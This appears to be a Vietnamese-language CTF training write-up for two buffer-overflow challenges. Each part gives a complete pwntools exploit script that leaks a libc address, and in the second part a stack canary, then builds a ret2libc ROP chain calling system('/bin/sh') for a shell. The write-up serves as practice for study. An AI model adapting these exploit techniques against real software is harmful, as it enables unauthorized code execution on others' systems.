# Training
<details>
<summary>1. bof1chall1 </summary>
	
- Bài cho ta 1 file binary
- Đầu tiên ta checksec

![](https://i.imgur.com/r0ePODu.png)

- Tiếp theo vào IDA coi thì thấy có lỗi buffer overflow ở cả 2 biến `buf` và `v6`

![](https://i.imgur.com/Xq2Uj29.png)

- Bài không có canary nên ta chỉ cần tìm padding để overwrite ret của `main` bằng pop_rdi leak libc ra các thứ đưa về dạng sgk ret2libc thôi. Để thoát ra thì cần nhập 3.
- Script: 
```python
from pwn import *
exe = ELF("bof4chall1")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process(exe.path)
pop_rdi_ret = 0x0000000000401463

payload = b'a'*88  + p64(pop_rdi_ret) + p64(exe.got['puts']) + p64(exe.plt['puts'])+p64(exe.sym['main'])

p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'song: ',b'a')
p.sendlineafter(b'URL: ',payload)
p.sendlineafter(b'> ',b'3')

leak = u64(p.recvline()[:-1] + b'\x00\x00')
libc.address=leak-528080

payload = b'a'*88  + p64(pop_rdi_ret) +p64(next(libc.search(b'/bin/sh')))+p64(0x000000000040101a)+ p64(libc.sym['system'])

p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'song: ',b'a')
p.sendlineafter(b'URL: ',payload)
p.sendlineafter(b'> ',b'3')


p.interactive()
```
</details>

<details>
<summary>2. bof1chall2 </summary>
    
- Bài cho ta 1 file binary
- Đầu tiên ta checksec
    
![](https://i.imgur.com/SpgymX1.png)

- Tiếp theo vào IDA để xem thử. Nhận thấy có lỗi buffer overflow quá lộ ở hàm `vuln

![](https://i.imgur.com/qXDhSjI.png)

- Bài này thì canary bật và ta lợi dụng hàm `puts` để `leak`. Ta cần tìm padding tới canary rồi padding nhiêu đó để puts leak
- Tiếp theo leak được thì đưa về dạng sgk ret2libc như trên.

```python
from pwn import *
exe = ELF("bof4chall2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process(exe.path)
p.sendlineafter(b'name ?\n',b'a'*17)
p.recvuntil(b'\x0a')
leak = u64(b'\x00'+ p.recvn(7))
print(hex(leak))
pop_rdi_ret = 0x00000000004013b3
payload = b'a'*8 + p64(leak) + b'a'*40+ p64(pop_rdi_ret) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.sym['main'])

p.sendlineafter(b'rop ?\n',payload)
p.recvuntil(b'enabled?\n')
libc_leak = u64(p.recvline()[:-1] + b'\x00\x00')
libc.address = libc_leak - 528080

p.sendlineafter(b'name ?\n',b'a')
payload = b'a'*8 + p64(leak) + b'a'*40+ p64(pop_rdi_ret)+p64(next(libc.search(b'/bin/sh')))+p64(0x000000000040101a)+ p64(libc.sym['system'])
p.sendlineafter(b'rop ?\n',payload)
p.interactive()
```
</details>
